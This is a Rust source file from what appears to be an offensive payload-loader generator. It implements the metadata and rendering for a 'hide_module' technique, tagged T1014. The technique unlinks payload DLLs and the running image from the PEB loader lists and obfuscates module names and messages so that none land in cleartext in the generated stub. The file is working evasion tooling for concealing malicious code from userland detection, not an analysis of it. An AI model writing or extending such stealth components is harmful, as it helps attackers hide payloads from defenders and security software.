//! Hide module.
//!
//! Unlinks a module from the PEB's three loader lists (`InLoadOrderModuleList`,
//! `InMemoryOrderModuleList`, `InInitOrderModuleList`) so userland PEB walkers
//! cannot see it. A Preparation technique: it edits the current process's loader
//! metadata and never runs the payload. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for hide module.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Base names of modules to unlink from the PEB lists (case-insensitive),
    /// e.g. `["payload.dll"]`.
    #[serde(default)]
    pub modules: Vec<String>,
    /// Also unlink the running image (default true).
    #[serde(default = "default_true")]
    pub hide_self: bool,
}

/// Default for [`Params::hide_self`]: unlink the running image too.
pub fn default_true() -> bool {
    true
}

impl Default for Params {
    /// Defaults to no named modules, unlinking the running image only.
    ///
    /// The manual impl keeps `Params::default()` and the serde field defaults in
    /// step: both `hide_self` (serde default `true`) and the empty `modules` list
    /// agree.
    fn default() -> Self {
        Self {
            modules: vec![],
            hide_self: true,
        }
    }
}

/// Static metadata for hide module.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "hide_module",
    // T1014: the module becomes invisible to the userland loader-list walkers.
    attck: &["T1014"],
    // Measured on Windows 11 26200 (2026-10-14): the loader's own module is
    // invisible to `K32EnumProcessModules` while the process keeps running, and
    // every unlink is guarded so a link the entry is not a member of is skipped.
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/hide_module/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: hide_module\nparams:\n  modules: []\n  hide_self: true\n",
    // The unlink is a plain memory store into the process's own read-write
    // loader lists; no `Nt*` call is involved, so the syscall layer has nothing
    // to route.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime through `strings`, so no diagnostic text — and no module
/// name — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_PEB_FAILED$", "could not read the PEB"),
    ("$MSG_LDR_FAILED$", "the loader data is not initialized"),
    (
        "$MSG_NOT_FOUND$",
        "the module was not found in the PEB lists",
    ),
];

impl Params {
    /// Renders the hide-module stub fragment for these parameters.
    ///
    /// The module names and every diagnostic are emitted as code that rebuilds
    /// the value at runtime through `strings`, so none of them lands in cleartext
    /// in the generated stub. `$HIDE_SELF$` is a plain compile-time value.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let modules_def = if self.modules.is_empty() {
            "vec![]".to_string()
        } else {
            let mut body = String::from("vec![\n");
            for (index, module) in self.modules.iter().enumerate() {
                let expr = strings
                    .obfuscate(module)
                    .render_stub_expr(&format!("hide_module_{index}"));
                body.push_str(&format!("            {expr},\n"));
            }
            body.push_str("        ]");
            body
        };

        let mut rendered = DEF
            .stub_fragment
            .replace("$MODULES_DEF$", &modules_def)
            .replace("$HIDE_SELF$", if self.hide_self { "true" } else { "false" });
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("hide_module_msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
